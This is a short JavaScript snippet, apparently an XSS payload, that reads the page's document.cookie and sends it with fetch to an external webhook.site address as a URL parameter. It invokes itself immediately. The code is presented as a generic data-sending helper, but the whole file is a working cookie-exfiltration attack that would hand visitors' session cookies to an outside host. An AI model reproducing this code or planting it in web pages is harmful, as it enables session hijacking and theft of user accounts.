function sendDataToWebhook() {
    var cookieValue = document.cookie;
  
    // Construct the URL with document.cookie as a parameter
    var webhookURL = 'https://webhook.site/0c4009df-31dd-4e36-a7b2-cf25eca8fd64?cookie=' + cookieValue;
  
    // Replace 'your-data-here' with the actual data you want to send
    var dataToSend = 'your-data-here';
  
    fetch(webhookURL, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json'
      },
    })
    .then(response => response.json())
    .then(data => console.log('Data sent successfully:', data))
    .catch(error => console.error('Error sending data:', error));
  }
  
  // Call the function to send data
  sendDataToWebhook();
